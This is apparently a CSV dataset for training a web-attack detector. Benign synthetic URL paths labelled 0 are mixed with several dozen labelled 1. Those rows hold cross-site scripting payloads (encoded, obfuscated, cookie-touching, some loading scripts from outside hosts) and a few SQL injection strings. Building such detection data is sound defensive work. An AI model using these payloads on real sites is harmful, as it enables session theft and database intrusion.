payload,label
/index.php?user=kma942,0
"-1<IMG LOWSRC=""javascript:document.cookie=true;"">",1
/index.php?page=shoes256,0
/api/v1/users?token=123272,0
/api/v1/users?user=123606,0
/api/v1/users?user=2026822,0
/home?page=2026835,0
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('CrossSiteScripting');+ADw-/SCRIPT+AD4-",1
/search?token=apple167,0
/api/v1/users?token=123794,0
/assets/style.css?page=123168,0
/login.html?id=apple634,0
/index.php?token=book849,0
/api/v1/users?q=kma621,0
/home?q=shoes640,0
/product/detail?id=123641,0
/api/v1/users?user=admin233,0
/login.html?user=apple412,0
/api/v1/users?id=admin393,0
/search?category=123349,0
/home?token=profile226,0
/api/v1/users?id=profile74,0
/api/v1/users?category=123267,0
/assets/style.css?q=hải224,0
/login.html?q=123244,0
"<IMG SRC=`javascript:alert(""RM'CrossSiteScripting'"")`>",1
/assets/style.css?category=apple811,0
/search?user=shoes76,0
/assets/style.css?token=admin619,0
/home?id=profile46,0
/api/v1/users?page=apple393,0
/assets/style.css?id=admin944,0
/product/detail?page=hải759,0
/product/detail?user=kma599,0
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",1
/product/detail?user=profile428,0
/search?user=hải386,0
/search?category=hải316,0
/api/v1/users?page=profile315,0
/index.php?id=admin664,0
/search?page=apple973,0
/product/detail?id=admin543,0
/product/detail?q=kma484,0
/index.php?page=2026344,0
/index.php?token=book219,0
/index.php?id=apple866,0
/assets/style.css?q=123435,0
/api/v1/users?id=apple156,0
/index.php?token=shoes480,0
/index.php?page=contact202,0
/index.php?user=hải220,0
/login.html?q=kma112,0
"<SCRIPT a=`>` SRC=""http://vulnerability-lab.com/CrossSiteScripting.js""></SCRIPT>",1
/home?q=kma271,0
/index.php?user=apple527,0
/index.php?token=apple385,0
"<a&#32;href&#61;&#91;&#00;&#93;""&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;"">XYZ</a",1
"EMBED SRC=""http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess=""never"" and allownetworking=""internal"" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:",1
/product/detail?q=shoes867,0
/search?category=2026604,0
/product/detail?page=kma386,0
/search?user=profile656,0
'+prompt(9)+',1
/product/detail?category=contact40,0
/assets/style.css?token=123201,0
"<A HREF=""http://google:ha.ckers.org"">XSS</A>",1
/index.php?user=hải686,0
/assets/style.css?user=123251,0
/product/detail?token=book141,0
/search?id=admin183,0
/product/detail?user=123800,0
/assets/style.css?page=hải799,0
/index.php?page=kma898,0
/assets/style.css?q=2026367,0
Redirect 302 /vlab.jpg http://vulnerability-lab.com/admin.asp&deleteuser,1
"<A HREF=""http://google.com/"">XSS</A>",1
/search?id=kma623,0
<form><button formaction=javascript&colon;alert(1)>CLICKME,1
/api/v1/users?id=apple704,0
/index.php?user=book539,0
/product/detail?q=123116,0
"<IMG SRC=""javascript:document.cookie=true;"">",1
/api/v1/users?page=shoes790,0
/assets/style.css?page=admin900,0
/home?q=contact276,0
/home?category=shoes676,0
/search?category=123663,0
/index.php?q=shoes142,0
/product/detail?q=2026862,0
/search?id=admin250,0
/product/detail?user=shoes985,0
/index.php?q=123198,0
/assets/style.css?q=book426,0
/api/v1/users?token=hải202,0
/login.html?user=book889,0
/search?user=kma683,0
">""¼script¾document.cookie=true;¼/script¾",1
"{""id"": ""1' OR 1=1--""}",1
"<CrossSiteScripting STYLE=""CrossSiteScripting:expression(document.cookie=true)"">",1
/api/v1/users?category=profile931,0
/login.html?category=apple80,0
/api/v1/users?token=hải261,0
/search?token=123150,0
/search?token=apple656,0
-1<SCRIPT>document.cookie=true;</SCRIPT>,1
"<iframe\uB\uC\uAsrc\uB\uC\uA=\uB\uC\uA ""javascript:alert(1);"">",1
/assets/style.css?id=profile595,0
/product/detail?token=hải377,0
/login.html?category=apple552,0
/index.php?q=admin849,0
/api/v1/users?q=apple598,0
/api/v1/users?user=admin621,0
/home?id=profile19,0
/product/detail?page=book439,0
%00<script>alert('XSS')</script>,1
/login.html?page=apple701,0
/product/detail?page=contact438,0
/login.html?category=admin993,0
%27%20OR%201%3D1--,1
/login.html?page=kma72,0
/search?id=2026741,0
/assets/style.css?category=contact696,0
/index.php?token=hải542,0
/assets/style.css?user=book974,0
/product/detail?category=12349,0
/assets/style.css?user=apple156,0
/home?user=kma169,0
/assets/style.css?page=apple54,0
/index.php?id=shoes97,0
/search?id=book393,0
<iframe src=http://vulnerability-lab.com/>@gmail.com,1
/assets/style.css?page=123739,0
/index.php?user=admin957,0
"perl -e 'print ""<SCR\0IPT>alert(\""CrossSiteScripting\"")</SCR\0IPT>"";' > out",1
/login.html?user=profile772,0
/login.html?token=apple855,0
/search?page=hải622,0
/home?token=profile817,0
/search?category=shoes312,0
/login.html?token=profile380,0
/search?category=profile559,0
/index.php?category=apple733,0
/index.php?id=2026357,0
/search?user=book426,0
/index.php?page=book144,0
/index.php?page=book627,0
/login.html?token=hải808,0
/assets/style.css?user=kma491,0
/assets/style.css?user=2026745,0
/home?q=shoes174,0
/api/v1/users?token=kma278,0
/home?id=profile202,0
/home?id=hải528,0
/api/v1/users?page=hải386,0
/api/v1/users?category=book953,0
/product/detail?token=123192,0
/product/detail?page=apple418,0
/index.php?token=shoes233,0
"111""+onmouseover=alert(11123);",1
/product/detail?category=hải253,0
/assets/style.css?token=shoes71,0
/assets/style.css?id=admin871,0
"<XML SRC=""xsstest.xml"" ID=I></XML>",1
/product/detail?user=profile878,0
/login.html?q=admin893,0
/api/v1/users?q=2026438,0
/home?user=hải5,0
/login.html?q=book238,0
""" onfocusout=alert(1) autofocus x=""",1
/assets/style.css?user=2026365,0
/login.html?q=kma199,0
/home?token=apple286,0
/login.html?page=kma504,0
/product/detail?user=2026700,0
/home?user=admin660,0
/product/detail?id=hải809,0
/index.php?q=12366,0
"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",1
"<var onmouseover=""prompt(1)"">On Mouse Over</var>",1
/search?token=12371,0
/product/detail?id=hải34,0
/home?token=profile804,0
/index.php?page=hải620,0
/index.php?category=kma302,0
/product/detail?id=apple177,0
/product/detail?id=hải246,0
/api/v1/users?page=profile887,0
/index.php?id=contact983,0
/search?token=kma553,0
/product/detail?user=book566,0
/assets/style.css?q=123578,0
%uff1cscript%uff1ealert(document.cookie)%uff1c/script%uff1ealert,1
/assets/style.css?q=book783,0
/assets/style.css?token=shoes294,0
"<div onmouseover=""document.cookie=true;"">",1
/index.php?token=123560,0
/login.html?id=2026270,0
/assets/style.css?id=admin989,0
/assets/style.css?user=apple755,0
' OR 1=1;#,1
/assets/style.css?q=profile567,0
/home?user=2026433,0
/home?category=profile986,0
/search?q=shoes440,0
/home?id=2026111,0
/login.html?user=book741,0
/api/v1/users?page=kma426,0
/login.html?q=book843,0
/home?category=contact135,0
/product/detail?page=admin342,0
"<STYLE>.CrossSiteScripting{background-image:url(""javascript:document.cookie=true"");}</STYLE><A CLASS=CrossSiteScripting></A>",1
/search?q=profile991,0
/login.html?user=profile812,0
/search?token=admin522,0
<BODY ONLOAD=alert('CrossSiteScripting')>,1
/login.html?user=2026534,0
/assets/style.css?id=hải715,0
/product/detail?q=apple843,0
/home?category=kma640,0
/index.php?token=contact892,0
/home?id=2026110,0
/product/detail?category=kma437,0
/home?user=123100,0
"<img src=""javascript:document.cookie=true;"">",1
/assets/style.css?token=apple186,0
/search?id=admin340,0
/api/v1/users?id=profile50,0
/index.php?category=admin94,0
/search?token=contact773,0
/index.php?page=hải598,0
/product/detail?id=12388,0
/search?user=contact73,0
/api/v1/users?category=shoes490,0
/index.php?category=2026161,0
/api/v1/users?page=apple412,0
/search?id=contact103,0
/index.php?id=202653,0
<img/src/onerror=alert(1)>,1
">""<body onload=""document.cookie=true;"">",1
/home?page=admin624,0
/home?page=contact8,0
/assets/style.css?category=kma358,0
/product/detail?category=book942,0
"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",1
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,1
/api/v1/users?id=contact448,0
/product/detail?q=kma931,0
"<BASE HREF=""javascript:alert('XSS');//"">",1
/index.php?id=profile411,0
/product/detail?q=apple344,0
/assets/style.css?page=2026475,0
/home?user=kma559,0
/search?user=apple626,0
/assets/style.css?q=apple50,0
/home?token=123685,0
/home?id=shoes818,0
/login.html?id=kma335,0
/search?user=book318,0
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",1
/index.php?user=kma924,0
/assets/style.css?category=contact46,0
/index.php?id=book20,0
/product/detail?category=2026995,0
/login.html?q=profile439,0
/product/detail?user=profile682,0
/product/detail?user=book574,0
/home?category=kma290,0
/api/v1/users?id=profile622,0
"<XML SRC=""http://ha.ckers.org/xsstest.xml"" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",1
/search?user=profile250,0
&#x03C;,1
/assets/style.css?token=hải629,0
/home?id=book443,0
/search?user=hải769,0
/index.php?id=123666,0
/product/detail?q=123337,0
/login.html?q=book101,0
/index.php?id=kma268,0
/assets/style.css?category=kma321,0
/home?page=2026497,0
/assets/style.css?page=123124,0
/index.php?id=kma133,0
/home?category=apple992,0
/assets/style.css?q=admin542,0
/product/detail?token=2026341,0
/assets/style.css?q=kma594,0
/login.html?category=kma108,0
'-- -,1
/index.php?page=apple829,0
/index.php?token=hải559,0
/index.php?q=profile486,0
/assets/style.css?user=2026575,0
/product/detail?q=contact619,0
/assets/style.css?token=book430,0
/api/v1/users?category=profile378,0
/product/detail?page=hải349,0
/product/detail?category=contact22,0
/index.php?page=apple480,0
/search?q=admin560,0
/home?token=kma141,0
/search?user=admin690,0
/login.html?page=kma488,0
/index.php?id=admin276,0
/home?page=shoes185,0
/login.html?user=kma99,0
/assets/style.css?user=kma660,0
/login.html?page=2026688,0
/search?q=123201,0
/home?page=kma753,0
/login.html?token=contact598,0
/index.php?page=apple140,0
/login.html?page=hải705,0
/login.html?category=2026538,0
/assets/style.css?category=admin74,0
/product/detail?q=book10,0
/assets/style.css?user=kma338,0
/api/v1/users?id=apple62,0
/assets/style.css?page=profile461,0
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-&charset=utf8,1
/index.php?category=123943,0
/assets/style.css?q=shoes288,0
/api/v1/users?user=profile352,0
/product/detail?user=123197,0
/assets/style.css?category=shoes979,0
/index.php?token=hải623,0
/home?q=apple115,0
/search?token=kma450,0
/login.html?id=contact106,0
">""<STYLE type=""text/css"">BODY{background:url(""javascript:document.cookie=true"")}</STYLE>",1
/home?token=hải194,0
/login.html?token=kma803,0
/search?user=apple426,0
/api/v1/users?q=kma418,0
/index.php?token=hải657,0
/assets/style.css?page=kma214,0
/api/v1/users?page=2026122,0
/login.html?token=apple267,0
"-1<xml id=""X""><a><b><script>document.cookie=true;</script>;</b></a></xml>",1
"<A HREF=""http://ha.ckers.org@google"">XSS</A>",1
/api/v1/users?token=hải689,0
/search?id=hải774,0
/index.php?category=2026461,0
/product/detail?q=2026126,0
/index.php?page=kma528,0
/index.php?user=profile296,0
/login.html?category=kma154,0
%u0022%u003e%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%u0072%u0074%u0028%u0027%u0048%u0065%u006c%u006c%u006f%u0027%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e,1
/search?user=shoes516,0
/api/v1/users?q=hải474,0
PGlmcmFtZSBzcmM9aHR0cDovL3Rlc3QuZGU+,1
/api/v1/users?id=profile269,0
/assets/style.css?q=123536,0
/index.php?q=profile971,0
/index.php?id=123767,0
/search?token=2026642,0
/index.php?user=123577,0
/index.php?page=123155,0
/search?id=contact240,0
/login.html?page=hải40,0
/api/v1/users?page=profile197,0
/product/detail?category=contact485,0
/index.php?token=kma448,0
"<LAYER SRC=""http://ha.ckers.org/scriptlet.html""></LAYER>",1
/product/detail?category=shoes431,0
/search?user=admin42,0
/product/detail?q=book695,0
">""<style type=""text/javascript"">document.cookie=true;</style>",1
' UNION SELECT NULL--,1
/api/v1/users?page=kma786,0
/search?id=shoes635,0
/api/v1/users?q=contact288,0
""" OR ""1""=""1",1
"<LINK REL=""stylesheet"" HREF=""javascript:alert('CrossSiteScripting');"">",1
/login.html?id=hải658,0
/assets/style.css?user=123895,0
/index.php?q=hải196,0
/search?q=2026212,0
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE,1
/home?id=123211,0
/product/detail?token=123808,0
/index.php?q=2026155,0
/home?id=profile299,0
/login.html?user=profile540,0
<HTML><BODY>,1
/home?q=123538,0
/login.html?token=123140,0
/home?user=123549,0
/login.html?q=book792,0
/home?category=2026345,0
/home?id=admin303,0
/index.php?page=admin257,0
/assets/style.css?q=12361,0
/home?q=hải425,0
/home?category=apple811,0
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%69%20%61%6D%20%68%65%72%65%27%29%3C%2F%73%63%72%69%70%74%3E,1
/home?q=contact118,0
/home?category=123328,0
/home?q=apple601,0
/index.php?page=book324,0
/search?token=apple650,0
<scr<script>ipt>alert(1)</scr<script>ipt>,1
/index.php?page=profile502,0
/product/detail?id=kma215,0
/api/v1/users?page=kma899,0
/login.html?page=admin814,0
/search?category=profile834,0
/api/v1/users?token=2026388,0
/index.php?page=contact623,0
/home?id=contact73,0
/api/v1/users?q=book175,0
/home?id=profile803,0
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",1
/api/v1/users?id=kma54,0
/api/v1/users?page=hải827,0
/search?page=2026952,0
/home?user=123739,0
/api/v1/users?q=apple446,0
/api/v1/users?page=contact639,0
/product/detail?q=book256,0
/home?id=apple282,0
/home?token=kma517,0
/assets/style.css?id=apple37,0
/index.php?token=hải556,0
/login.html?token=book630,0
/product/detail?q=2026553,0
/product/detail?id=shoes414,0
/login.html?page=apple506,0
/home?category=profile293,0
/product/detail?token=admin563,0
/assets/style.css?id=123831,0
/search?token=apple327,0
"-1<img src=""mocha:document.cookie=true;"">",1
/product/detail?token=contact264,0
/product/detail?category=123437,0
/assets/style.css?q=contact804,0
/assets/style.css?category=apple917,0
/home?user=kma621,0
/login.html?q=kma660,0
/index.php?category=123134,0
/product/detail?id=kma998,0
/home?id=2026463,0
/product/detail?page=profile393,0
/login.html?token=profile175,0
/product/detail?page=apple350,0
/search?id=hải269,0
/api/v1/users?token=kma186,0
/assets/style.css?token=profile612,0
/search?token=book59,0
<iframe src=http://ha.ckers.org/scriptlet.html <,1
/api/v1/users?page=kma722,0
/product/detail?user=hải31,0
"""/><script>alert('XSS')</script>",1
/index.php?token=apple810,0
/product/detail?page=kma960,0
/search?q=hải171,0
/home?user=contact636,0
/search?q=admin358,0
/login.html?id=admin724,0
/search?page=apple708,0
/product/detail?id=contact377,0
/index.php?user=hải636,0
/login.html?q=hải274,0
/product/detail?q=123824,0
/login.html?category=book558,0
/product/detail?category=kma623,0
/index.php?token=kma88,0
/api/v1/users?category=apple499,0
#444;background-image: expression(alert(1));,1
"<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">",1
"exp/*<A STYLE='no\xss:noxss(""*//*"");",1
/api/v1/users?page=shoes499,0
/home?page=2026372,0
with(document)alert(cookie),1
/assets/style.css?category=contact124,0
/home?user=book307,0
/assets/style.css?q=123507,0
/search?user=2026575,0
/login.html?category=apple952,0
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>,1
/product/detail?user=contact262,0
/product/detail?token=123600,0
/search?q=2026692,0
/product/detail?q=2026866,0
/index.php?page=shoes791,0
/index.php?q=contact930,0
/login.html?user=admin143,0
&#X00003c;,1
/login.html?page=apple181,0
/search?id=book470,0
/home?user=apple944,0
/search?q=kma290,0
/product/detail?page=shoes76,0
/index.php?category=book505,0
/login.html?id=123557,0
/index.php?user=shoes39,0
&quot&gt&lt;script&gt;&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;&lt;/script&gt;,1
/api/v1/users?id=hải516,0
"<IMG SRC=""jalert('XSS');"">",1
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00,1
/home?category=book483,0
/search?user=kma163,0
/search?user=shoes875,0
"<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(1)>"">",1
/api/v1/users?q=book332,0
/login.html?category=kma543,0
/assets/style.css?user=kma859,0
/product/detail?page=kma979,0
/assets/style.css?token=admin598,0
/login.html?q=123966,0
/assets/style.css?user=apple491,0
/home?token=2026109,0
/product/detail?page=apple296,0
/product/detail?user=book474,0
/login.html?id=apple739,0
/login.html?page=admin598,0
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>""> </BODY></HTML>",1
/product/detail?page=apple920,0
<SCRIPT>alert('XSS')</SCRIPT>,1
/assets/style.css?user=shoes941,0
/login.html?q=2026559,0
/product/detail?q=2026584,0
/assets/style.css?category=contact596,0
/search?q=admin262,0
/product/detail?q=hải508,0
/login.html?q=kma629,0
/search?page=profile97,0
"<a href=""javascript#document.cookie=true;"">",1
/index.php?id=kma687,0
/api/v1/users?user=contact277,0
/product/detail?id=2026775,0
/home?user=book389,0
/login.html?page=2026575,0
/product/detail?token=shoes967,0
/product/detail?q=2026740,0
/assets/style.css?page=book112,0
"<BODY BACKGROUND=""javascript:alert('XSS')"">",1
/product/detail?token=kma756,0
/login.html?token=profile440,0
/home?user=shoes837,0
/home?q=profile226,0
/assets/style.css?user=admin663,0
/api/v1/users?id=contact368,0
"<IMG SRC=# onmouseover=""alert('xxs')"">",1
') OR ('1'='1'#,1
/assets/style.css?id=2026236,0
/login.html?q=contact417,0
/index.php?user=kma904,0
/home?user=book734,0
/search?id=hải783,0
/search?page=profile928,0
/login.html?user=kma257,0
/login.html?q=hải325,0
/api/v1/users?token=apple618,0
/index.php?user=hải584,0
/login.html?page=profile958,0
/api/v1/users?q=hải71,0
/api/v1/users?page=book251,0
"""><script>alert(document.domain)</script>",1
/search?page=123884,0
">""<DIV STYLE=""width: expression(document.cookie=true);"">",1
"""><img src=x onerror=prompt(1)>.asd.asd",1
/product/detail?user=book833,0
